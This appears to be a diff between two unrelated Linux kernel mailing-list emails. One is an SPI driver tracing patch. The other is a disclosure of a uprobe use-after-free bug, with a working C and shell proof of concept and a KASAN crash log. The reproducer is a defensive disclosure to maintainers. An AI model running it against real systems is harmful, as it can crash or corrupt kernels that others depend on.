@@ -1,270 +1,393 @@
-Received: from mx0b-0031df01.pphosted.com (mx0b-0031df01.pphosted.com [205.220.180.131])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-qv1-f42.google.com (mail-qv1-f42.google.com [209.85.219.42])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 04240426EB7
-	for <linux-trace-kernel@vger.kernel.org>; Wed, 29 Jul 2026 15:13:43 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=205.220.180.131
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5673F3EC82C
+	for <linux-trace-kernel@vger.kernel.org>; Wed, 29 Jul 2026 15:20:10 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.219.42
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785338025; cv=none; b=fZL4zf6f46yXsJWM3AOqMj3a79spHaO0fTdAdrERniVuybntrwtNw9yb4VBu3mvFQzZkHVlo+IaCO7pgWY6Tw7ZwrDKS6s9rzmuQp4i36cZqjblVhpkqV/lnkSlHK45AH+WjQBseWN2ewljKvBzrm1in3cZcV+GJ2pW5QY4QkBo=
+	t=1785338412; cv=none; b=m2GbW9JPYFXCbMdJEYadDkr6LeiITUjVyymsNkHuO7w36dMWdPu2qVZ+iYDcO+Pb4Sq4+2nopgiLgzt6K13bpqoIxG1IVoT57EGvlTkYcWDRFYJ8voWbjSojj6U3Q9Cfl+jMfkpCat5yMsHe7qZfxgKGDc3MJPeewaAk5zAbnpM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785338025; c=relaxed/simple;
-	bh=NW9OfWcn7zy6+5dpNWHitm6R6TnMYmxPjElKxMspfvA=;
-	h=From:Date:Subject:MIME-Version:Content-Type:Message-Id:References:
-	 In-Reply-To:To:Cc; b=Z4DX6S827UjrMgfWO4BbO6XqUqm5A/5z1W14dAzbQJS4XRyw8jppMvUqClJenQHEKeAhRrw5xpaufaWJ8ShbgbkGmE2V39c1fsJMh/GkRzm+r6F36bcO3KZ3dI4t93YwQxmIy/Cs4740A0HbBvH3BMQEMmmKGXrJrxXSCNXJpoA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com; spf=pass smtp.mailfrom=oss.qualcomm.com; dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b=jvNXJEyc; dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b=N9b7SboP; arc=none smtp.client-ip=205.220.180.131
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=oss.qualcomm.com
+	s=arc-20240116; t=1785338412; c=relaxed/simple;
+	bh=NyHstGmacE1j1YQ+YtogufOIyV1a73sdVmuM+OS8Mc0=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=t3J9+thhALO597uft/23LBBHS3ueIdvJiLRJGJzpy+TfJXadlMg+H6J+esqcutxaCSTkdTNyqjqPpy99zka/dtSjznq5mYcgcIN8rdXZ7DN+6LxnIQzlBrERV/+v/FbHaoCAqcCS8NLl3ccA0BE+Z7wPklfVGlzRkyaBfPk6OrM=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=K1xdmB5l; arc=none smtp.client-ip=209.85.219.42
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b="jvNXJEyc";
-	dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b="N9b7SboP"
-Received: from pps.filterd (m0279868.ppops.net [127.0.0.1])
-	by mx0a-0031df01.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 66TF3Lvd2195053
-	for <linux-trace-kernel@vger.kernel.org>; Wed, 29 Jul 2026 15:13:43 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualcomm.com; h=
-	cc:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=qcppdkim1; bh=
-	sITuVOmRTLgtM0SYU13wJSBTuqa5KGwf+255oDtx3hc=; b=jvNXJEycsdFKlA17
-	1LIpCdo8B+a6KtIUogOiHSikPtGEpRRE0aB7ks62pSWTllCrhr4oDC6lucDJst85
-	tFRFo+9YRmU+kvVQTDHeGICImcz1FY7jA2B5qnPmMVU5ywL+m+C+2miJhcc5P9zK
-	mGpPH5JHHpVv7hLnIIaAb20TPqGl+uxINpN/XNP2GV9qmZSXu4o8oPfgOQybgoJO
-	efssY10crJ2EOaD+JiWCRb166NkLki7C17B4RXRg0U3FgX/JpXixL9LV/sAvyKUn
-	BETU9s+a/AKKSFHiq7a3DY2pdKv+blEHMIn1xPUzjN/QeGjKxDVJp6XO7hBHQZAw
-	RVvVpg==
-Received: from mail-pf1-f198.google.com (mail-pf1-f198.google.com [209.85.210.198])
-	by mx0a-0031df01.pphosted.com (PPS) with ESMTPS id 4fqkfm8775-1
-	(version=TLSv1.3 cipher=TLS_AES_128_GCM_SHA256 bits=128 verify=NOT)
-	for <linux-trace-kernel@vger.kernel.org>; Wed, 29 Jul 2026 15:13:42 +0000 (GMT)
-Received: by mail-pf1-f198.google.com with SMTP id d2e1a72fcca58-8487eb67173so1870826b3a.2
-        for <linux-trace-kernel@vger.kernel.org>; Wed, 29 Jul 2026 08:13:42 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="K1xdmB5l"
+Received: by mail-qv1-f42.google.com with SMTP id 6a1803df08f44-8ef1dc934d1so9257296d6.0
+        for <linux-trace-kernel@vger.kernel.org>; Wed, 29 Jul 2026 08:20:10 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=oss.qualcomm.com; s=google; t=1785338022; x=1785942822; darn=vger.kernel.org;
-        h=cc:to:in-reply-to:references:message-id:content-transfer-encoding
-         :content-type:mime-version:subject:date:from:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=sITuVOmRTLgtM0SYU13wJSBTuqa5KGwf+255oDtx3hc=;
-        b=N9b7SboPHWnEGf1mdPATzAEC+5ci/q2M9a0F5lrOScxIqKK6jDhXR2prAbcSns1tkT
-         sJaRcIPRnf7/mXpmiI/sdWnfWXGKwJ/rtHN9hx6eJIh1xy9f894klMIO8ep+yr039P4x
-         Bo5Falz+RG4ISOgqAXf1NHwM9RgE5EJ3h7rpNb/nJoe9alief2gdhCtINs/txlsyxGpz
-         99Df62Z+sC0ZX6lUhsjPREOW1C68A/K780iM+PSRJ9LY91pW8jTFsgYaVFu3oGJotbYl
-         5E8s22jsqqNE5ns/MoE6pr84x5pLyM2Dvuu9a2kQyOen7Y38+U030KUlRlAYrcoEYi7q
-         /U/w==
+        d=gmail.com; s=20251104; t=1785338409; x=1785943209; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=krhmBw0BsSxcvE4oV/rZCWfBCWYWklSuqeDZ0dfRz88=;
+        b=K1xdmB5lqThGn7nqFkKuufSZZzjiGKqQJSLCNazvDO7BZlKKt5YEvUeuyZqUFYSMKN
+         0DksCVftgk9uBRkP3CQU+2USsY+kwe51DP3YbtHk9bjnreKikG/gbQW2qPpMvmZvOwY7
+         O+Qgba4I2iUBIGg+LawdLO2pTMEnBFPnAtuN1V+fSs+5QN29ZtYNfdDgBmQKGOM5Myl4
+         Ovu23TrwTHvsUumPwtaYNS9W8yoKIDM1klzZ5Nu3eL+GruYJShfuvYhX1mnJ0k7pTzDp
+         QZbN1CzI24tDoPy2kFoKuNMXAKA7Bi6KTSrBY8A8ElB8HcCpWUxj3jK1FIiNBTALYCTD
+         W0TQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785338022; x=1785942822;
-        h=cc:to:in-reply-to:references:message-id:content-transfer-encoding
-         :content-type:mime-version:subject:date:from:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=sITuVOmRTLgtM0SYU13wJSBTuqa5KGwf+255oDtx3hc=;
-        b=J2e/nIJ/CzFoK12BAhNxICvyNUvkBQdaec44sxa7FHxjg5l77/yyiZVRBNDpTJXo4x
-         m1yHk1rYxvf8RdE13hb4+Cl8mpTRRPQeasEoBeEpHiAD2llbevoB78rRRtaF4Z2t+K6x
-         G3lEPQhjvAQtxSug7VzLcq8fhNDYYICLzY9CznTc8xi1n+Tlkfy/Yj+yYjCYK1xL/jum
-         GCOvJsyIk1qMjQDVTnOpgBt+XlGa+j8HMwZAWNVq0I3BQAhOL+tE0Zf2sI4ycoyS62jD
-         VQAun0CSkZl0oX9TtW4FjnhH9kqLrhKi7EnRDTdNKbpkTFUT0hrbFwbUjq/xRNLUk28O
-         QkEA==
-X-Forwarded-Encrypted: i=1; AHgh+Rp0lwK5VBPZ9vNTHKIoUAB2jEKKYwfCvWimOkWQssRBcBQTammxlHyXBK/J0VMDm922mdqsNPIPbz90KWIXFcZBZTs=@vger.kernel.org
-X-Gm-Message-State: AOJu0YzbRwEiNJ5sfVs+7pWQ7nUcuEy9u7hiauOX3jMQRzDiGR5FZBuU
-	micO9m4e1bc4X7QtnCci4lRpzt+mcyLOov11qAuCjR2lisv131R3+2BEJn3qJhL79jGXOcc+XmE
-	TdC2vPgVTgG//AGp7F5m4uncSrH2MxI0kM3J0GGxaqk95CD0Expwzm2f6SeMQsWG6aIoiF3SSn+
-	k=
-X-Gm-Gg: AR+sD13p9OJLCBc4aHdX1ry7exMCZ4PIyNOOXlQytshlr4O/S+apdek4fbl//CW2EbP
-	SI17ns3Tkm86n4A69tAWJ+Dm4ngFaVJ6oTduIuwO/lQzMEZq7YaerGrzKLxexiKjf6OAqxtl+s/
-	Xi6vUdnlwSVTJmA4FrUjIBtxNdgTeiDrsG6JXeeVheidbdvx/TWPvHBmMkhkbn2fG9QE8KTiQjR
-	iN8Q0ltA73MZ9GNBM5UTz+u1NgYcV7mMkQ1jl5Z5bZtYGYB5oRO7xDO/km9jV1jGFyKU500L/eQ
-	nvI3A1+CIkpUvhoIv++pQ1TsaDeLDL4FYDx2ENt2pMARrLCJCXiXwwAgfZME96Kh7H04qzK9On/
-	IPOzISbMTPzTlcq72EbqnQRz3fOg7gIsqxg==
-X-Received: by 2002:a05:6a00:4f83:b0:847:8f8a:a05d with SMTP id d2e1a72fcca58-84e9324bc95mr7447250b3a.29.1785338021787;
-        Wed, 29 Jul 2026 08:13:41 -0700 (PDT)
-X-Received: by 2002:a05:6a00:4f83:b0:847:8f8a:a05d with SMTP id d2e1a72fcca58-84e9324bc95mr7447216b3a.29.1785338021277;
-        Wed, 29 Jul 2026 08:13:41 -0700 (PDT)
-Received: from hu-ptalari-hyd.qualcomm.com ([202.46.22.19])
-        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e9fe238ffsm1617920b3a.12.2026.07.29.08.13.37
+        d=1e100.net; s=20251104; t=1785338409; x=1785943209;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=krhmBw0BsSxcvE4oV/rZCWfBCWYWklSuqeDZ0dfRz88=;
+        b=XlfmmoUzIxxtpjPuqFTf9u572DDE7eSJseVI/GR6epOO72f0pyMYbMXRjiqX1XO1b0
+         xbVPhrzsz8rX6KVM/jSkCNI5mMLGD/7Nxeua69PO6j1OY8khhiF4N3sP3BdjEqTw6Dl9
+         kebSyC4aBu/rYuEZALLF6udcqTkBqwh6wmOKS9vkfv5uv/JCrE95siImR+sq9fLG8w0V
+         Hm6ytWCnVeIl60MXNHiXcu5L+s57Wvbh1jF4dIHpB/JEKaCm/FBhyrTzJlVzpqvfXypO
+         IOxicapZC1A3UPHkHQVI2BrR/rJN5lXHCzKYNtYLjNOfKnQ/hW6bFLmB9fiW3ZOr3Kjx
+         +Ylw==
+X-Forwarded-Encrypted: i=1; AHgh+RoQm/76mVHkS3JnfVhrvz4hymD8MkZjdqgJVn1/uYwLbORGcV0F/q/FYvspyKLgLgNcxIUKgFOktzS7C1A5NvhOOvE=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yxh2Ev+twiUr+PQU7AiVOu53+PlJ99dIPFiL4dNSIwoYPZVXXMH
+	g7QAVcK2XPLD65dbFTkUTTxFs+P4lqr0B8GT3TBK3Ydk6X+3/Y1A3qGH
+X-Gm-Gg: AR+sD10Xd2kDpK34PKPHmYgPgW5lO9xQPLqJXUEkUzV4APSL0ophQ5Y7ii6boNEW86W
+	tHDMOxjao9D/vnb3XGXb/ybjBmcAD38DANTiQ5i0/p1y1PkSno1+NYLJBPu6a7EyNIEo+6MdcIj
+	IRA34rbhO311u+gbpzabayuxjhDccTMdKqutCa7qvjD8zLWX83zQOR9wAjl7vsNNEvgn2PG+U2r
+	ucxaz0TnOL03snzhVTDIhkgpZW6hh+ERHjJRfyK260QvyECpUOCVVMQDaJGKTU6ct6GH9lyMfiY
+	QhubK0dLn53OtJnpzakfYm7Kxk1e11+/BPnUBYzMznkc9K1UgFoNBPjgx9lEzSacR7LfhS97gFv
+	xImmMcbg+DcGmBUG6Vk9lIxc0sn1mhYfA09YCGmIhfg66zf4CaUepdyciMRuLddzib9ZkvVEkwf
+	AszS4K0wcoq2ly/pNI8E5LhKZPBfQfENQpOPFopr37E06ZMl39jRcd8hgfxBHY7qXuRZCpkK/Ka
+	sge
+X-Received: by 2002:a05:6214:3f87:b0:8fd:6e22:6631 with SMTP id 6a1803df08f44-90822a3c50fmr27599686d6.29.1785338408802;
+        Wed, 29 Jul 2026 08:20:08 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
+        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-9081dc4286dsm26812166d6.7.2026.07.29.08.20.03
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 29 Jul 2026 08:13:40 -0700 (PDT)
-From: Praveen Talari <praveen.talari@oss.qualcomm.com>
-Date: Wed, 29 Jul 2026 20:43:26 +0530
-Subject: [PATCH v4 2/2] spi: qcom-geni: add GENI SE registers trace event
- on error paths
+        Wed, 29 Jul 2026 08:20:08 -0700 (PDT)
+From: Ren Wei <enjou1224z@gmail.com>
+To: linux-kernel@vger.kernel.org,
+	linux-trace-kernel@vger.kernel.org
+Cc: rostedt@goodmis.org,
+	mhiramat@kernel.org,
+	mathieu.desnoyers@efficios.com,
+	vega@nebusec.ai,
+	rakukuip@gmail.com,
+	enjou1224z@gmail.com
+Subject: [PATCH 0/1] kernel/trace: Fix use-after-free in unregister_trace_uprobe()
+Date: Wed, 29 Jul 2026 23:19:58 +0800
+Message-ID: <cover.1785227724.git.rakukuip@gmail.com>
+X-Mailer: git-send-email 2.51.0
 Precedence: bulk
 X-Mailing-List: linux-trace-kernel@vger.kernel.org
 List-Id: <linux-trace-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-trace-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-trace-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 7bit
-Message-Id: <20260729-add-tracepoints-for-se-reg-dump-v4-2-08bbd63b0ed2@oss.qualcomm.com>
-References: <20260729-add-tracepoints-for-se-reg-dump-v4-0-08bbd63b0ed2@oss.qualcomm.com>
-In-Reply-To: <20260729-add-tracepoints-for-se-reg-dump-v4-0-08bbd63b0ed2@oss.qualcomm.com>
-To: Bjorn Andersson <andersson@kernel.org>,
-        Konrad Dybcio <konradybcio@kernel.org>,
-        Steven Rostedt <rostedt@goodmis.org>,
-        Masami Hiramatsu <mhiramat@kernel.org>,
-        Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
-        Mark Brown <broonie@kernel.org>, konrad.dybcio@oss.qualcomm.com
-Cc: Praveen Talari <praveen.talari@oss.qualcomm.com>,
-        linux-kernel@vger.kernel.org, linux-arm-msm@vger.kernel.org,
-        linux-trace-kernel@vger.kernel.org, linux-spi@vger.kernel.org,
-        Mukesh Kumar Savaliya <mukesh.savaliya@oss.qualcomm.com>
-X-Mailer: b4 0.15.2
-X-Developer-Signature: v=1; a=ed25519-sha256; t=1785338008; l=4641;
- i=praveen.talari@oss.qualcomm.com; s=20251114; h=from:subject:message-id;
- bh=NW9OfWcn7zy6+5dpNWHitm6R6TnMYmxPjElKxMspfvA=;
- b=Cows3PFQgRziy5axFV+RsOhLjyzXw9+7M173yBpGUmJifzYNXbk74VmLMq6UV6uruzkYXz6+9
- OU6O0b120FsAwNHPFwGM5/VskIhFkMri6Pne74glL4+S+u1RLqrEevq
-X-Developer-Key: i=praveen.talari@oss.qualcomm.com; a=ed25519;
- pk=NGK/88fjyHXgfhIKwag7+uIytOmyOypvZ/hDFaYPEss=
-X-Authority-Analysis: v=2.4 cv=D6p37PRj c=1 sm=1 tr=0 ts=6a6a18a6 cx=c_pps
- a=m5Vt/hrsBiPMCU0y4gIsQw==:117 a=fChuTYTh2wq5r3m49p7fHw==:17
- a=IkcTkHD0fZMA:10 a=RAioF0-LDSMA:10 a=s4-Qcg_JpJYA:10
- a=VkNPw1HP01LnGYTKEx00:22 a=u7WPNUs3qKkmUXheDGA7:22 a=ZpdpYltYx_vBUK5n70dp:22
- a=EUspDBNiAAAA:8 a=SuVZUjzzKY3ZPv7-dKMA:9 a=QEXdDO2ut3YA:10 a=O8hF6Hzn-FEA:10
- a=IoOABgeZipijB_acs4fv:22
-X-Proofpoint-GUID: QRY6NrjxqjDNvhsk_lkd9zmwvYnxcCzS
-X-Proofpoint-Spam-Info: AW1haW4tMjYwNzI5MDEyMyBTYWx0ZWRfXwEuaXH37BuAk
- FlHU1cLUZbGRIFONKCD/K3a1ZoCnGkzOnzB/U0rPvIdTSXl3jja8lWABHb8DSy5cWCNQ3qNZ+IM
- w/csQ1NsGXBU5Tqrw83H11o9ItwCc5g=
-X-Proofpoint-ORIG-GUID: QRY6NrjxqjDNvhsk_lkd9zmwvYnxcCzS
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwNzI5MDEyMyBTYWx0ZWRfXzS7RcjCUoKx5
- yAky8j+/504Vgk4+fVVJAOzautbymkO288qhZFfll3pm8Q2UEXxftxjWxjIkqJjFkdLjSOHPIZu
- bCjZOdzNNT2dmqxlDafgT837lODRrY3lqmyAFsboaG5aDCDkqeVvDoWQOUWiffannDIwJbrfjkG
- IUsEzBE9u4l8GvPbgukX6oPLQJEXlONHQxQ4IE052TGVMqmfcT0Xbbt68AWpz3nJYOZ75lh+VEw
- +AOmFAehTxfcRRW3sqHETb3SBoTOmxi8PV05OqAj6nIUje/tM8fITIaKdhn7mS+dgyv7nKfTtT9
- YZmYMiBQnyA7F+dSsNn2COURLZUlOcO0X2F7cBv1XXZDtxqeuO0Dr+odST6qOwxE5lTxEW2HZvN
- s6FXdJ+OpNxOkAoQlL2YmkPEjMMoFLTKoQMr+VUm29N+m6Xpobi91eLJzVhhWKSc9UcHrlQK1h1
- ZxuAWlPwA4y8cqqmjJw==
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.134,FMLib:17.12.100.49
- definitions=2026-07-29_06,2026-07-29_01,2025-10-01_01
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0
- bulkscore=0 impostorscore=0 suspectscore=0 spamscore=0 lowpriorityscore=0
- malwarescore=0 priorityscore=1501 phishscore=0 clxscore=1015 adultscore=0
- classifier=typeunknown authscore=0 authtc= authcc= route=outbound adjust=0
- reason=mlx scancount=1 engine=8.22.0-2606150000 definitions=main-2607290123
+Content-Transfer-Encoding: 8bit
 
-The GENI SPI driver reports various transfer failures such as command
-timeouts, DMA reset timeouts, DMA transaction errors, and unexpected
-interrupt conditions. However, diagnosing the root cause of these
-failures is difficult as the hardware state is not captured when the
-error occurs.
+From: Luxiao Xu <rakukuip@gmail.com>
 
-Add trace_geni_se_regs() calls at critical SPI error handling paths to
-automatically capture GENI serial engine debug registers when failures
-are detected. This includes:
+Hi Linux kernel maintainers,
 
-- M_CMD abort/cancel timeout
-- DMA TX/RX FSM reset timeout
-- DMA transaction failures and pending residue conditions
-- Unexpected interrupt error status
-- Premature transfer completion with pending TX/RX data
+We found and validated an issue in kernel/trace/trace_uprobe.c. The bug is reachable by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-Dumping the SE debug registers at the time of failure provides
-additional hardware context and significantly improves post-mortem
-analysis of SPI transfer issues without affecting normal operation.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Acked-by: Mukesh Kumar Savaliya <mukesh.savaliya@oss.qualcomm.com>
-Reviewed-by: Konrad Dybcio <konrad.dybcio@oss.qualcomm.com>
-Signed-off-by: Praveen Talari <praveen.talari@oss.qualcomm.com>
----
- drivers/spi/spi-geni-qcom.c | 23 +++++++++++++++++++----
- 1 file changed, 19 insertions(+), 4 deletions(-)
+---- details below ----
 
-diff --git a/drivers/spi/spi-geni-qcom.c b/drivers/spi/spi-geni-qcom.c
-index 2914d781dbf5..8528f9b80f03 100644
---- a/drivers/spi/spi-geni-qcom.c
-+++ b/drivers/spi/spi-geni-qcom.c
-@@ -1,6 +1,8 @@
- // SPDX-License-Identifier: GPL-2.0
- // Copyright (c) 2017-2018, The Linux foundation. All rights reserved.
- 
-+#include <trace/events/qcom_geni_se.h>
-+
- #define CREATE_TRACE_POINTS
- #include <trace/events/qcom_geni_spi.h>
- 
-@@ -192,6 +194,7 @@ static void handle_se_timeout(struct spi_controller *spi)
- 	time_left = wait_for_completion_timeout(&mas->abort_done, HZ);
- 	if (!time_left) {
- 		dev_err(mas->dev, "Failed to cancel/abort m_cmd\n");
-+		trace_geni_se_regs(se);
- 
- 		/*
- 		 * No need for a lock since SPI core has a lock and we never
-@@ -209,8 +212,10 @@ static void handle_se_timeout(struct spi_controller *spi)
- 				writel(1, se->base + SE_DMA_TX_FSM_RST);
- 				spin_unlock_irq(&mas->lock);
- 				time_left = wait_for_completion_timeout(&mas->tx_reset_done, HZ);
--				if (!time_left)
-+				if (!time_left) {
- 					dev_err(mas->dev, "DMA TX RESET failed\n");
-+					trace_geni_se_regs(se);
-+				}
- 			}
- 			if (xfer->rx_buf) {
- 				spin_lock_irq(&mas->lock);
-@@ -218,8 +223,10 @@ static void handle_se_timeout(struct spi_controller *spi)
- 				writel(1, se->base + SE_DMA_RX_FSM_RST);
- 				spin_unlock_irq(&mas->lock);
- 				time_left = wait_for_completion_timeout(&mas->rx_reset_done, HZ);
--				if (!time_left)
-+				if (!time_left) {
- 					dev_err(mas->dev, "DMA RX RESET failed\n");
-+					trace_geni_se_regs(se);
-+				}
- 			}
- 		} else {
- 			/*
-@@ -391,10 +398,12 @@ static void
- spi_gsi_callback_result(void *cb, const struct dmaengine_result *result)
- {
- 	struct spi_controller *spi = cb;
-+	struct spi_geni_master *mas = spi_controller_get_devdata(spi);
- 
- 	spi->cur_msg->status = -EIO;
- 	if (result->result != DMA_TRANS_NOERROR) {
- 		dev_err(&spi->dev, "DMA txn failed: %d\n", result->result);
-+		trace_geni_se_regs(&mas->se);
- 		spi_finalize_current_transfer(spi);
- 		return;
- 	}
-@@ -404,6 +413,7 @@ spi_gsi_callback_result(void *cb, const struct dmaengine_result *result)
- 		dev_dbg(&spi->dev, "DMA txn completed\n");
- 	} else {
- 		dev_err(&spi->dev, "DMA xfer has pending: %d\n", result->residue);
-+		trace_geni_se_regs(&mas->se);
- 	}
- 
- 	spi_finalize_current_transfer(spi);
-@@ -953,8 +963,10 @@ static irqreturn_t geni_spi_isr(int irq, void *data)
- 
- 	if (m_irq & (M_CMD_OVERRUN_EN | M_ILLEGAL_CMD_EN | M_CMD_FAILURE_EN |
- 		     M_RX_FIFO_RD_ERR_EN | M_RX_FIFO_WR_ERR_EN |
--		     M_TX_FIFO_RD_ERR_EN | M_TX_FIFO_WR_ERR_EN))
-+		     M_TX_FIFO_RD_ERR_EN | M_TX_FIFO_WR_ERR_EN)) {
- 		dev_warn(mas->dev, "Unexpected IRQ err status %#010x\n", m_irq);
-+		trace_geni_se_regs(se);
-+	}
- 
- 	spin_lock(&mas->lock);
- 
-@@ -983,13 +995,16 @@ static irqreturn_t geni_spi_isr(int irq, void *data)
- 				 * weren't written correctly.
- 				 */
- 				if (mas->tx_rem_bytes) {
-+					trace_geni_se_regs(se);
- 					writel(0, se->base + SE_GENI_TX_WATERMARK_REG);
- 					dev_err(mas->dev, "Premature done. tx_rem = %d bpw%d\n",
- 						mas->tx_rem_bytes, mas->cur_bits_per_word);
- 				}
--				if (mas->rx_rem_bytes)
-+				if (mas->rx_rem_bytes) {
- 					dev_err(mas->dev, "Premature done. rx_rem = %d bpw%d\n",
- 						mas->rx_rem_bytes, mas->cur_bits_per_word);
-+					trace_geni_se_regs(se);
-+				}
- 			} else {
- 				complete(&mas->cs_done);
- 			}
+Bug details:
+
+When unregistering a trace_uprobe in unregister_trace_uprobe(), if the target
+probe has sibling probes attached to the same dynamic event, trace_probe_has_sibling()
+returns true. In this case, unregister_trace_uprobe() skips the dynamic event busy
+check (trace_event_dyn_busy()) and directly executes dyn_event_remove(),
+trace_probe_unlink(), and free_trace_uprobe().
+
+However, unregister_trace_uprobe() fails to check whether the specific trace_uprobe
+itself is currently enabled (i.e. trace_probe_is_enabled()). If an enabled
+trace_uprobe is unregistered, its underlying structure is freed while active
+uprobe consumers remain registered. Subsequent or concurrent uprobe events will still
+trigger uprobe_dispatcher(), which attempts to access the already freed trace_uprobe
+object, leading to a Use-After-Free (UAF) condition that can corrupt memory or
+crash the kernel.
+
+Root Cause:
+Missing trace_probe_is_enabled() check before unlinking and freeing the trace_uprobe
+structure when handling sibling probes.
+
+Reproducer:
+
+    unshare -Urn ./poc.sh
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+#include <unistd.h>
+
+__attribute__((noinline)) int victim(int x)
+{
+    return x + 1;
+}
+
+int main(void)
+{
+    volatile int x = 0;
+
+    while (1) {
+        x = victim(x);
+        if (x > 1000000)
+            x = 0;
+    }
+
+    return 0;
+}
+
+------END poc.c--------
+
+------BEGIN poc.sh------
+
+#!/bin/bash
+set -euxo pipefail
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "run as root" >&2
+    exit 1
+fi
+
+SCRIPT_DIR=$(cd -- "$(dirname -- "$0")" && pwd)
+BIN=/tmp/u4a_target
+
+if [ -d /sys/kernel/tracing ]; then
+    TRACEFS=/sys/kernel/tracing
+else
+    TRACEFS=/sys/kernel/debug/tracing
+fi
+
+# Build a hot loop target and find the file offset for victim().
+gcc -O0 -g -fno-omit-frame-pointer -o "$BIN" "$SCRIPT_DIR/poc.c"
+OFF=$(nm "$BIN" | awk '/ victim$/{print "0x"$1; exit}')
+if [ -z "$OFF" ]; then
+    echo "failed to resolve victim offset" >&2
+    exit 1
+fi
+
+cd "$TRACEFS"
+echo 0 > tracing_on || true
+echo > uprobe_events || true
+
+# Create two sibling uprobes under one event name.
+echo "p:u4a_grp/u4a_evt $BIN:$OFF arg1=%ip" > uprobe_events
+echo "p:u4a_grp/u4a_evt $BIN:$OFF arg1=\$stack" >> uprobe_events
+
+# Keep event active, then remove siblings by event name.
+echo 1 > events/u4a_grp/u4a_evt/enable
+"$BIN" >/dev/null 2>&1 &
+TARGET_PID=$!
+sleep 1
+echo "-:u4a_grp/u4a_evt" >> uprobe_events || true
+
+# Expect kernel panic / KASAN splat shortly after this point.
+sleep 10
+
+echo "target pid=$TARGET_PID still alive; crash did not trigger in this run" >&2
+exit 1
+
+------END poc.sh--------
+
+----BEGIN crash log----
+
+[  196.380209][ T9269] =========================================================
+./poc.sh: line 3[  196.381493][ T9269] BUG: KASAN: slab-use-after-free in handl0
+[  196.383421][ T9269] Read of size 8 at addr ffff888034697c18 by task u4a_targ9
+[  196.384283][ T9269] 
+[  196.410300][ T9269] CPU: 1 UID: 0 PID: 9269 Comm: u4a_target Not tainted 7.0 
+[  196.410317][ T9269] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
+[  196.410348][ T9269] Call Trace:
+[  196.410371][ T9269]  <TASK>
+[  196.410374][ T9269]  dump_stack_lvl+0x10e/0x1f0
+[  196.411147][ T9269]  print_report+0xf7/0x600
+[  196.411178][ T9269]  ? preempt_count_sub+0x13/0xd0
+[  196.411223][ T9269]  ? __virt_addr_valid+0x1ab/0x330
+[  196.411274][ T9269]  ? __phys_addr+0x41/0x90
+[  196.411283][ T9269]  ? handler_chain+0x211/0xd90
+[  196.411297][ T9269]  kasan_report+0xe4/0x120
